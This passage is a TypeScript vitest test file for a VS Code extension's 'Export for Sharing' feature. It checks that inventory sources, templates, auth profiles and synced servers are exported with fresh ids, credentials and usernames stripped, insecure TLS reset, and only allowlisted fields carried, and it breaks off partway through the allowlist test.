/**
 * Export for Sharing carries the dynamic-inventory tree as a CACHE: inventory
 * sources, device templates and saved filters travel sanitized, and every
 * synced server keeps its `origin`, re-pointed at the shipped source's fresh
 * id — so the recipient's source owns those rows from the moment of import and
 * its first sync updates them in place instead of adding copies.
 *
 * The load-bearing test is the round trip at the bottom: the sender's tree is
 * produced by a REAL sync (`computeSyncPlan` + `applyInventorySyncPlan`), the
 * file by the REAL `nexus.config.export` command, the recipient's state by the
 * REAL `nexus.config.import` command, and the recipient's first plan by the
 * REAL engine against the same devices. Zero adds, zero prunes.
 *
 * The share path runs no cipher, so unlike the backup suites nothing here needs
 * the backup key derivation faked (`test/helpers/fastBackupKdf.ts`).
 */
import { beforeEach, describe, expect, it, vi } from "vitest";

const registeredCommands = new Map<string, (...args: unknown[]) => unknown>();
const mockShowInformationMessage = vi.fn();
const mockShowErrorMessage = vi.fn();
const mockShowWarningMessage = vi.fn();
const mockShowQuickPick = vi.fn();
const mockShowSaveDialog = vi.fn();
const mockShowOpenDialog = vi.fn();
const mockShowInputBox = vi.fn();
const mockWriteFile = vi.fn();
const mockReadFile = vi.fn();
const mockExecuteCommand = vi.fn();
const mockConfigUpdate = vi.fn();

vi.mock("vscode", () => ({
  commands: {
    registerCommand: (id: string, handler: (...args: unknown[]) => unknown) => {
      registeredCommands.set(id, handler);
      return { dispose: () => undefined };
    },
    executeCommand: (...args: unknown[]) => mockExecuteCommand(...args)
  },
  window: {
    showInformationMessage: (...args: unknown[]) => mockShowInformationMessage(...args),
    showErrorMessage: (...args: unknown[]) => mockShowErrorMessage(...args),
    showWarningMessage: (...args: unknown[]) => mockShowWarningMessage(...args),
    showQuickPick: (...args: unknown[]) => mockShowQuickPick(...args),
    showSaveDialog: (...args: unknown[]) => mockShowSaveDialog(...args),
    showOpenDialog: (...args: unknown[]) => mockShowOpenDialog(...args),
    showInputBox: (...args: unknown[]) => mockShowInputBox(...args),
    withProgress: (_opts: unknown, task: (progress: unknown, token: unknown) => Promise<void>) =>
      task({ report: () => undefined }, { isCancellationRequested: false, onCancellationRequested: () => undefined })
  },
  env: { clipboard: { readText: async () => "" } },
  workspace: {
    fs: {
      writeFile: (...args: unknown[]) => mockWriteFile(...args),
      readFile: (...args: unknown[]) => mockReadFile(...args),
      readDirectory: async () => [],
      stat: async () => {
        throw new Error("ENOENT");
      },
      createDirectory: async () => undefined
    },
    workspaceFolders: [{ uri: { fsPath: "/workspace", scheme: "file", path: "/workspace" }, name: "workspace", index: 0 }],
    getConfiguration: (section: string) => ({
      get: (_key: string, fallback?: unknown) => fallback,
      inspect: () => ({ defaultValue: undefined, globalValue: undefined, workspaceValue: undefined }),
      update: (key: string, value: unknown) => mockConfigUpdate(section, key, value)
    })
  },
  Uri: {
    file: (fsPath: string) => ({ fsPath, scheme: "file" }),
    joinPath: (base: { fsPath: string; scheme: string }, ...parts: string[]) => ({
      fsPath: [base.fsPath, ...parts].join("/").replace(/\/+/g, "/"),
      scheme: base.scheme
    })
  },
  FileType: { File: 1, Directory: 2 },
  ConfigurationTarget: { Global: 1 },
  ProgressLocation: { Notification: 15 },
  QuickPickItemKind: { Separator: -1, Default: 0 }
}));

import { registerConfigCommands, sanitizeForSharing } from "../../src/commands/configCommands";
import { NexusCore } from "../../src/core/nexusCore";
import { InMemoryConfigRepository } from "../../src/storage/inMemoryConfigRepository";
import { InMemoryMacroStore } from "../../src/storage/inMemoryMacroStore";
import { getMacros, setActiveMacroStore } from "../../src/macroSettings";
import { computeSyncPlan, planToApplication, type InventorySyncPlan } from "../../src/services/inventory/syncEngine";
import { createBuiltInProviders } from "../../src/services/inventory/builtInProviders";
import { EVE_NG_PROVIDER_ID } from "../../src/services/inventory/providers/eveNgProvider";
import { GNS3_PROVIDER_ID } from "../../src/services/inventory/providers/gns3Provider";
import { PROXMOX_PROVIDER_ID } from "../../src/services/inventory/providers/proxmoxProvider";
import { inventorySecretKey, type InventoryDevice, type InventorySourceConfig, type InventoryTree } from "../../src/models/inventory";
import type { AuthProfile, LocalShellProfile, SerialProfile, ServerConfig, ServerOrigin, TunnelProfile } from "../../src/models/config";
import type { TerminalMacro } from "../../src/models/terminalMacro";
import type { DeviceTemplateProfile } from "../../src/models/deviceTemplate";
import type { SecretVault } from "../../src/services/ssh/contracts";

class MockVault implements SecretVault {
  private readonly secrets = new Map<string, string>();
  async get(key: string) { return this.secrets.get(key); }
  async store(key: string, value: string) { this.secrets.set(key, value); }
  async delete(key: string) { this.secrets.delete(key); }
  keys(): string[] { return [...this.secrets.keys()]; }
}

interface Machine {
  core: NexusCore;
  vault: MockVault;
}

async function makeMachine(): Promise<Machine> {
  const core = new NexusCore(new InMemoryConfigRepository());
  await core.initialize();
  return { core, vault: new MockVault() };
}

function register(machine: Machine): void {
  registeredCommands.clear();
  registerConfigCommands(machine.core, machine.vault);
}

/** Runs the real `nexus.config.export` (Export for Sharing) command and returns the file it wrote. */
async function exportShare(machine: Machine): Promise<string> {
  register(machine);
  let written = "";
  mockShowSaveDialog.mockResolvedValueOnce({ fsPath: "/fake/nexus-shared.json", scheme: "file" });
  mockWriteFile.mockImplementationOnce(async (_uri: unknown, data: Uint8Array) => {
    written = Buffer.from(data).toString("utf8");
  });
  await registeredCommands.get("nexus.config.export")!();
  expect(written).not.toBe("");
  return written;
}

/** Drives `nexus.config.import` → Nexus Export File… with `json` as the file's contents. */
async function importShare(machine: Machine, json: string): Promise<void> {
  register(machine);
  mockShowQuickPick.mockResolvedValueOnce({ value: "nexusExport" });
  mockShowOpenDialog.mockResolvedValueOnce([{ fsPath: "/fake/nexus-shared.json", scheme: "file" }]);
  mockReadFile.mockResolvedValueOnce(Buffer.from(json, "utf8"));
  await registeredCommands.get("nexus.config.import")!();
  expect(mockShowErrorMessage).not.toHaveBeenCalled();
}

/** A hand-built share payload — what a hand-edited file, or an older build, could hold. */
function shareJson(payload: Record<string, unknown>): string {
  return JSON.stringify({
    version: 2,
    exportType: "share",
    exportedAt: new Date().toISOString(),
    inventoryStatusPollPerSource: true,
    servers: [],
    settings: {},
    ...payload
  });
}

function lastInfoMessage(): string {
  const calls = mockShowInformationMessage.mock.calls;
  return String(calls[calls.length - 1]?.[0] ?? "");
}

function makeSource(overrides: Partial<InventorySourceConfig> = {}): InventorySourceConfig {
  return {
    id: "src-1",
    providerId: "netbox",
    name: "Lab NetBox",
    targetFolder: "NetBox",
    prunePolicy: "orphan",
    defaultUsername: "netops",
    config: { baseUrl: "https://netbox.example.com" },
    secretFieldIds: ["apiToken"],
    ...overrides
  };
}

function makeServer(overrides: Partial<ServerConfig> = {}): ServerConfig {
  return {
    id: "srv-1",
    name: "Router",
    host: "10.0.0.1",
    port: 22,
    username: "netops",
    authType: "agent",
    isHidden: false,
    ...overrides
  };
}

function makeProfile(overrides: Partial<AuthProfile> = {}): AuthProfile {
  return { id: "ap-1", name: "Lab login", username: "netops", authType: "password", ...overrides };
}

/** A device-template-owned synced row as a sync writes it: value and stamp equal. */
function syncedRow(overrides: Partial<ServerConfig> = {}): ServerConfig {
  return makeServer({
    id: "row-1",
    name: "core-sw-1",
    group: "NetBox",
    origin: {
      sourceId: "src-1",
      externalId: "device:1",
      syncedAt: 1_700_000_000_000,
      syncedInstanceKey: "https://netbox.example.com",
      syncedUsername: "netops",
      syncedHost: "10.0.0.1",
      syncedPort: 22
    },
    ...overrides
  });
}

beforeEach(async () => {
  vi.clearAllMocks();
  // VS Code always answers a notification with a Thenable; the share import
  // follows one up when it offers "Edit Inventory Source".
  mockShowInformationMessage.mockResolvedValue(undefined);
  const store = new InMemoryMacroStore();
  await store.initialize();
  setActiveMacroStore(store);
});

// ---------------------------------------------------------------------------
// Export: what `sanitizeForSharing` writes
// ---------------------------------------------------------------------------

describe("sanitizeForSharing — inventory sources", () => {
  const share = (sources: InventorySourceConfig[], servers: ServerConfig[] = [], profiles: AuthProfile[] = [], templates: DeviceTemplateProfile[] = []) =>
    sanitizeForSharing(servers, [], [], [], {}, profiles, [], sources, templates, []);

  it("ships each source with a fresh id and WITHOUT its trust stamp, sync bookkeeping or incarnation token (⊘ any of `providerFingerprint`, `revision`, `managedFolders`, `lastSyncAt` surviving the spread)", () => {
    const source = makeSource({
      providerFingerprint: "fp-sender",
      revision: "rev-sender",
      managedFolders: ["NetBox/Syd"],
      lastSyncAt: 1_700_000_000_000
    });

    const [shipped] = share([source]).inventorySources;

    expect(shipped.id).not.toBe("src-1");
    for (const key of ["providerFingerprint", "revision", "managedFolders", "lastSyncAt"]) {
      expect(shipped).not.toHaveProperty(key);
    }
    // …and the caller's live record is untouched.
    expect(source.providerFingerprint).toBe("fp-sender");
  });

  it("removes URL userinfo from any config string, leaving other strings alone (⊘ `https://user:token@netbox` — a credential in a non-secret field — travelling)", () => {
    const [shipped] = share([
      makeSource({ config: { baseUrl: "https://netops:tok3n@netbox.example.com/x", filter: "site=syd&role=core", note: "admin:secret@not-a-url" } })
    ]).inventorySources;

    expect(shipped.config.baseUrl).toBe("https://netbox.example.com/x");
    expect(JSON.stringify(shipped)).not.toContain("tok3n");
    expect(shipped.config.filter).toBe("site=syd&role=core");
    // Not a URL with credentials (it parses as scheme "admin:"), so not touched.
    expect(shipped.config.note).toBe("admin:secret@not-a-url");
  });

  it.each(createBuiltInProviders().map((provider) => [provider.id]))(
    "resets allowInsecureTls to false for the built-in provider %s (⊘ a file switching certificate checks off for the credentials the recipient is about to type; ⊘ a built-in provider missing from the reset list)",
    (providerId) => {
      const [shipped] = share([makeSource({ providerId, config: { baseUrl: "https://lab.example.com", allowInsecureTls: true } })]).inventorySources;
      expect(shipped.config.allowInsecureTls).toBe(false);
    }
  );

  it("carries a THIRD-PARTY provider's same-named fields verbatim — field ids are not reserved words (⊘ applying the built-in resets by field id regardless of provider)", () => {
    const [shipped] = share([
      makeSource({
        providerId: "acme.cmdb",
        config: { baseUrl: "https://cmdb.example.com", allowInsecureTls: true, statusPollSeconds: 30, username: "svc-reader" }
      })
    ]).inventorySources;

    expect(shipped.config).toMatchObject({ allowInsecureTls: true, statusPollSeconds: 30, username: "svc-reader" });
  });

  it("removes a built-in poller's status poll interval — polling is the sender's opt-in to unattended requests, not the recipient's (⊘ an auth-less GNS3 source starting to poll the sender's lab the moment the tree is visible)", () => {
    const shipped = share([
      makeSource({ id: "eve", providerId: EVE_NG_PROVIDER_ID, config: { baseUrl: "https://eve.example.com", statusPollSeconds: 30 } }),
      makeSource({ id: "pve", providerId: PROXMOX_PROVIDER_ID, config: { baseUrl: "https://pve.example.com:8006", statusPollSeconds: 60 } }),
      makeSource({ id: "gns", providerId: GNS3_PROVIDER_ID, secretFieldIds: [], config: { baseUrl: "http://gns3.example.com:3080", statusPollSeconds: 5 } })
    ]).inventorySources;

    for (const source of shipped) {
      expect(source.config).not.toHaveProperty("statusPollSeconds");
      expect(source.config.baseUrl).toBeDefined();
    }
  });

  it("removes a built-in provider's login `username` and rewrites defaultUsername to \"user\" (⊘ the sender's lab login and fallback SSH username travelling in a file whose usernames are all rewritten)", () => {
    const shipped = share([
      makeSource({ id: "eve", providerId: EVE_NG_PROVIDER_ID, defaultUsername: "evgeny", config: { baseUrl: "https://eve.example.com", username: "evgeny" } }),
      makeSource({ id: "gns", providerId: GNS3_PROVIDER_ID, defaultUsername: "evgeny", config: { baseUrl: "http://gns3.example.com:3080", username: "evgeny" } })
    ]).inventorySources;

    for (const source of shipped) {
      expect(source.defaultUsername).toBe("user");
      expect(source.config).not.toHaveProperty("username");
    }
    expect(JSON.stringify(shipped)).not.toContain("evgeny");
  });

  it("remaps the source's auth profile and ships that profile even when no server references it (⊘ collecting profile references from servers only, which ships a link to nothing)", () => {
    const profile = makeProfile({ id: "ap-src", name: "Source login" });

    const result = share([makeSource({ authProfileId: "ap-src" })], [], [profile]);

    expect(result.authProfiles).toHaveLength(1);
    expect(result.authProfiles[0].username).toBe("user");
    expect(result.inventorySources[0].authProfileId).toBe(result.authProfiles[0].id);
    expect(result.inventorySources[0].authProfileId).not.toBe("ap-src");
  });

  it("re-points templateRules at the shipped templates and drops a rule whose template is not in the snapshot (⊘ a sender template id surviving)", () => {
    const template: DeviceTemplateProfile = { id: "tpl-1", name: "Core", fields: { multiplexing: { mode: "override", value: true } } };
    const source = makeSource({
      templateRules: [
        { id: "rule-1", templateId: "tpl-1", filter: "role=core" },
        { id: "rule-2", templateId: "tpl-missing" }
      ]
    });

    const result = share([source], [], [], [template]);

    const [shippedTemplate] = result.deviceTemplates;
    expect(result.inventorySources[0].templateRules).toEqual([{ id: "rule-1", templateId: shippedTemplate.id, filter: "role=core" }]);
    expect(shippedTemplate.id).not.toBe("tpl-1");
    // A source whose every rule names a missing template ships no rules at all.
    const lone = share([makeSource({ templateRules: [{ id: "rule-2", templateId: "tpl-missing" }] })]);
    expect(lone.inventorySources[0].templateRules).toBeUndefined();
  });
});

describe("sanitizeForSharing — synced servers", () => {
  it("keeps a synced server's origin, re-pointed at the shipped source, with its receipt and address stamps verbatim (⊘ the old §B6 strip; ⊘ the sender's sourceId travelling)", () => {
    const row = syncedRow({ ipmiHost: "10.9.9.1", origin: { ...syncedRow().origin!, syncedIpmiHost: "10.9.9.1" } });

    const result = sanitizeForSharing([row], [], [], [], {}, [], [], [makeSource()]);

    const origin = result.servers[0].origin!;
    expect(origin.sourceId).toBe(result.inventorySources[0].id);
    expect(origin.sourceId).not.toBe("src-1");
    expect(origin).toMatchObject({
      externalId: "device:1",
      syncedAt: 1_700_000_000_000,
      syncedInstanceKey: "https://netbox.example.com",
      syncedHost: "10.0.0.1",
      syncedPort: 22,
      syncedIpmiHost: "10.9.9.1"
    });
  });

  it("rewrites origin.syncedUsername to \"user\" in lockstep with username, and invents none (⊘ the sender's stamp surviving, which makes every cached row read as hand-edited; ⊘ a stamp appearing on a row that had none)", () => {
    const stamped = syncedRow();
    const legacy = syncedRow({ id: "row-2", origin: { sourceId: "src-1", externalId: "device:2", syncedAt: 1 } });

    const result = sanitizeForSharing([stamped, legacy], [], [], [], {}, [], [], [makeSource()]);

    const [a, b] = result.servers;
    expect(a.username).toBe("user");
    expect(a.origin!.syncedUsername).toBe(a.username);
    expect(b.origin).not.toHaveProperty("syncedUsername");
  });

  it("remaps every id-bearing stamp through the lens its value uses, and drops one whose target is not in the bundle (⊘ a stamp carrying a sender id)", () => {
    const bastion = makeServer({ id: "bastion-1", name: "Bastion", host: "10.0.0.254" });
    const linked = makeProfile({ id: "ap-ssh", name: "SSH" });
    const bmc = makeProfile({ id: "ap-bmc", name: "BMC" });
    const row = syncedRow({
      authProfileId: "ap-ssh",
      ipmiAuthProfileId: "ap-bmc",
      ipmiGatewayServerId: "bastion-1",
      proxy: { type: "ssh", jumpHostId: "bastion-1" },
      origin: {
        ...syncedRow().origin!,
        syncedAuthProfileId: "ap-ssh",
        templated: { ipmiAuthProfileId: "ap-bmc", ipmiGatewayServerId: "bastion-1", proxy: { type: "ssh", jumpHostId: "bastion-1" }, multiplexing: false }
      }
    });
    const dangling = syncedRow({
      id: "row-2",
      origin: {
        ...syncedRow().origin!,
        externalId: "device:2",
        syncedAuthProfileId: "ap-gone",
        templated: { ipmiAuthProfileId: "ap-gone", ipmiGatewayServerId: "srv-gone", proxy: { type: "ssh", jumpHostId: "srv-gone" } }
      }
    });

    const result = sanitizeForSharing([bastion, row, dangling], [], [], [], {}, [linked, bmc], [], [makeSource()]);

    const newBastion = result.servers.find((s) => s.name === "Bastion")!;
    const shipped = result.servers.find((s) => s.origin?.externalId === "device:1")!;
    const sshProfile = result.authProfiles.find((p) => p.name === "SSH")!;
    const bmcProfile = result.authProfiles.find((p) => p.name === "BMC")!;
    // Each stamp equals the value beside it, in the file's own ids.
    expect(shipped.origin!.syncedAuthProfileId).toBe(sshProfile.id);
    expect(shipped.authProfileId).toBe(sshProfile.id);
    expect(shipped.origin!.templated).toEqual({
      ipmiAuthProfileId: bmcProfile.id,
      ipmiGatewayServerId: newBastion.id,
      proxy: { type: "ssh", jumpHostId: newBastion.id },
      multiplexing: false
    });
    expect(shipped.proxy).toEqual({ type: "ssh", jumpHostId: newBastion.id });

    const stranded = result.servers.find((s) => s.origin?.externalId === "device:2")!;
    expect(stranded.origin).not.toHaveProperty("syncedAuthProfileId", "ap-gone");
    expect(stranded.origin!.syncedAuthProfileId).toBeUndefined();
    // Every templated stamp named something absent, so the whole bag collapses.
    expect(stranded.origin!.templated).toBeUndefined();
    expect(JSON.stringify(result)).not.toMatch(/ap-ssh|ap-bmc|ap-gone|bastion-1|srv-gone/);
  });

  it("ships the profile a stamp names even when no value links it any more, so a per-server opt-out survives (⊘ collecting value links only, which drops the stamp and lets the recipient's first sync re-attach a profile the sender opted this server out of)", () => {
    const optedOut = syncedRow({ authProfileId: undefined, origin: { ...syncedRow().origin!, syncedAuthProfileId: "ap-old" } });

    const result = sanitizeForSharing([optedOut], [], [], [], {}, [makeProfile({ id: "ap-old", name: "Old login" })], [], [makeSource()]);

    expect(result.authProfiles.map((p) => p.name)).toEqual(["Old login"]);
    expect(result.servers[0].origin!.syncedAuthProfileId).toBe(result.authProfiles[0].id);
    expect(result.servers[0].authProfileId).toBeUndefined();
  });

  it("strips the origin of an addressed server whose source is not in the snapshot, and drops an addressless one with no origin at all (⊘ a dangling origin or a bare placeholder shipping)", () => {
    const dangling = syncedRow({ origin: { ...syncedRow().origin!, sourceId: "src-removed-here" } });
    const bare = makeServer({ id: "bare", name: "Bare placeholder", host: "", port: 0, addressless: true });

    const result = sanitizeForSharing([dangling, bare], [], [], [], {}, [], [], [makeSource()]);

    expect(result.servers.map((s) => s.name)).toEqual(["core-sw-1"]);
    expect(result.servers[0].origin).toBeUndefined();
    expect(result.servers[0].host).toBe("10.0.0.1");
  });
});

describe("sanitizeForSharing — a key profile, whose key file a share strips", () => {
  it("drops only the links the sync engine would roll back — the source's, a template's, and a row's own sync link with its stamp — and ships the profile with every other link to it (⊘ leaving the profile out, which strips a hand-linked server of its key authentication; ⊘ dropping every reference to it, a per-server opt-out stamp and an IPMI link included)", () => {
    const key = makeProfile({ id: "ap-key", name: "Lab key", authType: "key", keyPath: "/home/netops/.ssh/id_ed25519" });
    const row = (id: string, externalId: string, overrides: Partial<ServerConfig>, origin: Partial<ServerOrigin> = {}) =>
      syncedRow({ id, name: id, ...overrides, origin: { ...syncedRow().origin!, externalId, ...origin } });
    const servers = [
      makeServer({ id: "manual", name: "manual", authProfileId: "ap-key" }),
      row("sync-linked", "device:1", { authProfileId: "ap-key" }, { syncedAuthProfileId: "ap-key" }),
      row("hand-linked", "device:2", { authProfileId: "ap-key" }),
      row("opted-out", "device:3", {}, { syncedAuthProfileId: "ap-key" }),
      row("bmc", "device:4", { ipmiAuthProfileId: "ap-key" }, { templated: { ipmiAuthProfileId: "ap-key" } }),
      row("source-gone", "device:5", { authProfileId: "ap-key" }, { sourceId: "src-removed-here", syncedAuthProfileId: "ap-key" })
    ];
    const template: DeviceTemplateProfile = {
      id: "tpl-1",
      name: "Core",
      fields: { authProfileId: { mode: "override", value: "ap-key" }, ipmiAuthProfileId: { mode: "fill", value: "ap-key" } }
    };
    const source = makeSource({ authProfileId: "ap-key", templateRules: [{ id: "rule-1", templateId: "tpl-1" }] });

    const result = sanitizeForSharing(servers, [], [], [], {}, [key], [], [source], [template]);

    const [shipped] = result.authProfiles;
    expect(shipped).toMatchObject({ name: "Lab key", authType: "key" });
    expect(shipped.keyPath).toBeUndefined();
    const shippedRow = (name: string) => result.servers.find((s) => s.name === name)!;
    // What the engine would roll back on the recipient: gone, each link with its stamp.
    expect(result.inventorySources[0].authProfileId).toBeUndefined();
    expect(result.deviceTemplates[0].fields.authProfileId).toBeUndefined();
    expect(shippedRow("sync-linked").authProfileId).toBeUndefined();
    expect(shippedRow("sync-linked").origin?.syncedAuthProfileId).toBeUndefined();
    // What it never touches still names the profile.
    expect(shippedRow("manual").authProfileId).toBe(shipped.id);
    expect(shippedRow("hand-linked").authProfileId).toBe(shipped.id);
    expect(shippedRow("opted-out").origin?.syncedAuthProfileId).toBe(shipped.id);
    expect(shippedRow("bmc").ipmiAuthProfileId).toBe(shipped.id);
    expect(shippedRow("bmc").origin?.templated?.ipmiAuthProfileId).toBe(shipped.id);
    expect(result.deviceTemplates[0].fields.ipmiAuthProfileId).toEqual({ mode: "fill", value: shipped.id });
    // A row whose source does not travel arrives as a server no source owns — no sync unlinks it.
    expect(shippedRow("source-gone").origin).toBeUndefined();
    expect(shippedRow("source-gone").authProfileId).toBe(shipped.id);
  });
});

describe("sanitizeForSharing — device templates", () => {
  it("ships only the templates a source's rule names, and a profile only an unused template links stays behind (⊘ exporting the whole template library — names, proxies and profiles nothing in the file uses)", () => {
    const used: DeviceTemplateProfile = { id: "tpl-used", name: "Used", fields: { multiplexing: { mode: "override", value: true } } };
    const unused: DeviceTemplateProfile = {
      id: "tpl-unused",
      name: "Unrelated template",
      fields: {
        proxy: { mode: "override", value: { type: "socks5", host: "unrelated-proxy.example.com", port: 1080 } },
        authProfileId: { mode: "fill", value: "ap-unused" },
        ipmiAuthProfileId: { mode: "fill", value: "ap-shared" }
      }
    };
    const source = makeSource({ templateRules: [{ id: "rule-1", templateId: "tpl-used" }] });
    // "ap-shared" is also linked by a server that ships, so it ships for that server's sake.
    const server = makeServer({ id: "manual", name: "manual", authProfileId: "ap-shared" });
    const profiles = [makeProfile({ id: "ap-unused", name: "Unrelated login" }), makeProfile({ id: "ap-shared", name: "Shared login" })];

    const result = sanitizeForSharing([server], [], [], [], {}, profiles, [], [source], [used, unused]);

    expect(result.deviceTemplates.map((t) => t.name)).toEqual(["Used"]);
    expect(result.inventorySources[0].templateRules).toEqual([{ id: "rule-1", templateId: result.deviceTemplates[0].id }]);
    expect(result.authProfiles.map((p) => p.name)).toEqual(["Shared login"]);
    expect(JSON.stringify(result)).not.toMatch(/Unrelated|unrelated-proxy/);
  });

  it("ships templates with fresh ids and no revision, every reference re-pointed or removed, and a proxy's username stripped (⊘ a sender id or proxy username surviving)", () => {
    const gateway = makeServer({ id: "gw-1", name: "Gateway" });
    const profile = makeProfile({ id: "ap-ssh", name: "SSH" });
    const withRefs: DeviceTemplateProfile = {
      id: "tpl-1",
      name: "Core",
      revision: "rev-sender",
      fields: {
        authProfileId: { mode: "fill", value: "ap-ssh" },
        ipmiAuthProfileId: { mode: "fill", value: "ap-not-here" },
        ipmiGatewayServerId: { mode: "override", value: "gw-1" },
        logSession: { mode: "fill", value: false }
      }
    };
    const withSocks: DeviceTemplateProfile = {
      id: "tpl-2",
      name: "Via SOCKS",
      fields: { proxy: { mode: "override", value: { type: "socks5", host: "proxy.example.com", port: 1080, username: "proxy-user" } } }
    };
    const withLostJump: DeviceTemplateProfile = {
      id: "tpl-3",
      name: "Via missing bastion",
      fields: { proxy: { mode: "override", value: { type: "ssh", jumpHostId: "srv-not-here" } } }
    };

    const source = makeSource({
      templateRules: [
        { id: "rule-1", templateId: "tpl-1" },
        { id: "rule-2", templateId: "tpl-2" },
        { id: "rule-3", templateId: "tpl-3" }
      ]
    });

    const result = sanitizeForSharing([gateway], [], [], [], {}, [profile], [], [source], [withRefs, withSocks, withLostJump]);

    const [a, b, c] = result.deviceTemplates;
    expect(a.id).not.toBe("tpl-1");
    expect(a).not.toHaveProperty("revision");
    expect(a.fields).toEqual({
      authProfileId: { mode: "fill", value: result.authProfiles[0].id },
      ipmiGatewayServerId: { mode: "override", value: result.servers[0].id },
      logSession: { mode: "fill", value: false }
    });
    expect(b.fields.proxy).toEqual({ mode: "override", value: { type: "socks5", host: "proxy.example.com", port: 1080 } });
    expect(c.fields).toEqual({});
    expect(JSON.stringify(result.deviceTemplates)).not.toMatch(/ap-ssh|ap-not-here|gw-1|proxy-user|srv-not-here|rev-sender/);
  });
});

/**
 * WHICH FIELDS TRAVEL AT ALL. Every fixture below sets EVERY field its model
 * declares, plus one it does not (`futureStamp`) — the stand-in for a trust
 * stamp or consent record someone adds to the model later. The shipped key set
 * must be exactly the listed one: a spread in place of the allowlist carries
 * `futureStamp` out and turns these red. The NESTED records a share rebuilds —
 * a template rule, a template field's `{ mode, value }` wrapper, an SSH proxy —
 * carry an undeclared `token` for the same reason. (Adding a field to one of
 * the models fails `npm run compile` at the `ShareRules<…>` maps first.)
 */
const keysOf = (value: unknown): string[] => Object.keys(JSON.parse(JSON.stringify(value)) as object).sort();

const UNDECLARED = { token: "must-not-travel" };
const sshVia = (jumpHostId: string) => ({ type: "ssh" as const, jumpHostId, ...UNDECLARED });

const EVERY_TEMPLATED_STAMP = (jumpHostId: string, gatewayId: string, bmcProfileId: string) => ({
  proxy: sshVia(jumpHostId),
  multiplexing: true,
  legacyAlgorithms: false,
  logSession: true,
  ipmiAuthProfileId: bmcProfileId,
  ipmiGatewayServerId: gatewayId,
  futureStamp: "must-not-travel"
});

function everyOriginField(sourceId: string, ids: { jump: string; gateway: string; ssh: string; bmc: string }): ServerOrigin {
  return {
    sourceId,
    externalId: "device:1",
    syncedAt: 1_700_000_000_000,
    syncedInstanceKey: "https://netbox.example.com",
    syncedUsername: "netops",
    syncedAuthProfileId: ids.ssh,
    syncedIpmiHost: "10.9.9.1",
    syncedAltHost: "fd00::1",
    syncedProtocol: "telnet",
    syncedHost: "10.0.0.1",
    syncedPort: 23,
    templated: EVERY_TEMPLATED_STAMP(ids.jump, ids.gateway, ids.bmc),
    futureStamp: "must-not-travel"
  } as ServerOrigin;
}

function everySourceField(overrides: Partial<InventorySourceConfig> = {}): InventorySourceConfig {
  return {
    ...makeSource({
      authProfileId: "ap-ssh",
      templateRules: [{ id: "rule-1", templateId: "tpl-1", filter: "role=core", ...UNDECLARED }],
      lastSyncAt: 1_700_000_000_000,
      revision: "rev-sender",
      providerFingerprint: "fp-sender",
      managedFolders: ["NetBox/Syd"]
    }),
    futureStamp: "must-not-travel",
    ...overrides
  } as InventorySourceConfig;
}

function everyTemplateField(): DeviceTemplateProfile {
  return {
    id: "tpl-1",
    name: "Everything",
    revision: "rev-sender",
    fields: {
      proxy: { mode: "override", value: sshVia("bastion-1"), ...UNDECLARED },
      authProfileId: { mode: "fill", value: "ap-ssh", ...UNDECLARED },
      multiplexing: { mode: "override", value: true, ...UNDECLARED },
      legacyAlgorithms: { mode: "fill", value: false, ...UNDECLARED },
      logSession: { mode: "fill", value: true, ...UNDECLARED },
      ipmiAuthProfileId: { mode: "fill", value: "ap-bmc", ...UNDECLARED },
      ipmiGatewayServerId: { mode: "override", value: "gw-1", ...UNDECLARED },
      futureField: { mode: "fill", value: "must-not-travel" }
    },
    futureStamp: "must-not-travel"
  } as unknown as DeviceTemplateProfile;
}

const SHIPPED_SOURCE_KEYS = ["authProfileId", "config", "defaultUsername", "id", "name", "providerId", "prunePolicy", "secretFieldIds", "targetFolder", "templateRules"];
const SHIPPED_ORIGIN_KEYS = [
  "externalId", "sourceId", "syncedAltHost", "syncedAt", "syncedAuthProfileId", "syncedHost", "syncedInstanceKey",
  "syncedIpmiHost", "syncedPort", "syncedProtocol", "syncedUsername", "templated"
];
const SHIPPED_TEMPLATED_KEYS = ["ipmiAuthProfileId", "ipmiGatewayServerId", "legacyAlgorithms", "logSession", "multiplexing", "proxy"];
const SHIPPED_TEMPLATE_KEYS = ["fields", "id", "name"];
const SHIPPED_PROFILE_KEYS = ["authType", "id", "name", "username"];

/** An auth profile with every declared field set, a stored `token` and a member the model does not declare. */
function everyProfileField(id: string, name: string): AuthProfile {
  return {
    ...makeProfile({ id, name, username: "netops", keyPath: "/home/netops/.ssh/id_ed25519" }),
    token: "must-not-travel",
    futureStamp: "must-not-travel"
  } as AuthProfile;
}
const SHIPPED_TEMPLATE_FIELD_KEYS = ["authProfileId", "ipmiAuthProfileId", "ipmiGatewayServerId", "legacyAlgorithms", "logSession", "multiplexing", "proxy"];

/** The nested records inside what `shipped*` checked above: rules, field wrappers, SSH proxies. */
function expectNestedRecordsRebuilt(source: InventorySourceConfig, template: DeviceTemplateProfile, row: ServerConfig): void {
  expect(source.templateRules!.map(keysOf)).toEqual([["filter", "id", "templateId"]]);
  for (const wrapper of Object.values(template.fields)) {
    expect(keysOf(wrapper)).toEqual(["mode", "value"]);
  }
  expect(keysOf(template.fields.proxy!.value)).toEqual(["jumpHostId", "type"]);
  expect(keysOf(row.proxy)).toEqual(["jumpHostId", "type"]);
  expect(keysOf(row.origin!.templated!.proxy)).toEqual(["jumpHostId", "type"]);
}

describe("which fields a share carries — an allowlist, pinned", () => {
  it("export: a source, a synced server's origin and its templated stamps, and a template carry exactly the decided fields (⊘ a spread, which ships any field added to the model — another trust stamp — by default)", () => {
    const bastion = makeServer({ id: "bastion-1", name: "Bastion" });
    const gateway = makeServer({ id: "gw-1", name: "Gateway" });
    const row = syncedRow({
      authProfileId: "ap-ssh",
      ipmiAuthProfileId: "ap-bmc",
      ipmiGatewayServerId: "gw-1",
      proxy: sshVia("bastion-1"),
      origin: everyOriginField("src-1", { jump: "bastion-1", gateway: "gw-1", ssh: "ap-ssh", bmc: "ap-bmc" })
    });

    const result = sanitizeForSharing(
      [bastion, gateway, row],
      [], [], [], {},
      [makeProfile({ id: "ap-ssh", name: "SSH" }), makeProfile({ id: "ap-bmc", name: "BMC" })],
      [],
      [everySourceField()],
      [everyTemplateField()],
      []
    );

    expect(keysOf(result.inventorySources[0])).toEqual(SHIPPED_SOURCE_KEYS);
    const origin = result.servers.find((s) => s.origin !== undefined)!.origin!;
    expect(keysOf(origin)).toEqual(SHIPPED_ORIGIN_KEYS);
    expect(keysOf(origin.templated)).toEqual(SHIPPED_TEMPLATED_KEYS);
    expect(keysOf(result.deviceTemplates[0])).toEqual(SHIPPED_TEMPLATE_KEYS);
